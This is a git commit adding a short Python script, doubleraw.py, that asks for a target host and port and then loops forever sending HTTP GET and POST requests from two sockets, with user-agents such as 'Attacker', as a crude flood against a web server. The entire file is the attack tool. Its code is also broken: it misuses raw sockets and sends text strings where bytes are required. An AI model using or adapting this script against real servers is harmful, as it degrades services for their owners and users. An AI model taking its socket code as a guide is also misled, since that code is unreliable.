cb56a2bf7459d8e526b1a4db923af275a4558ec1
yaboih0w <34265323+yaboih0w@users.noreply.github.com>
2017-12-14 09:50:04 +0100

    main file to use

---
+++ doubleraw.py
@@ -0,0 +1,34 @@
+import socket, sys
+import time
+
+ # makes the first socket (tcp)
+
+sock1 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
+sock2 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
+ # asks what host to send packets to
+tgtIP = input("enter host to send packets to  ")
+ # asks what port to send packets to
+tgtPort = int(input("enter port to send packets to "))
+int(tgtPort)
+
+ # connects the sockets
+sock1.connect((tgtIP, tgtPort))
+sock2.connect((tgtIP, tgtPort))
+time.sleep(10) # delays the flood
+ #  the actual thing in action
+while True:
+    sock1.send('GET / HTTP/1.1\r\n')
+    sock1.send("User-agent: Raider of your site\r\n\r\n")
+    print (sock1.recv(1024))
+    sock1.send("POST / HTTP/1.1\r\n")
+    sock1.send("User-agent: Attacker\r\n\r\n")
+    print (sock1.recv(2048))
+    # this is sock1 attacking, and printing the info
+    print("Both attackers are on orbit")
+    # time for sock2 to go in
+    sock2.send('GET / HTTP/1.0\r\n')
+    sock2.send("User-agent: Attacker2\r\n\r\n")
+    print (sock2.recv(1024))
+    sock2.send("POST / HTTP/1.1\r\n")
+    sock2.send("User-agent: Attacker2 post flood\r\n\r\n")
+    print (sock2.recv(2048))
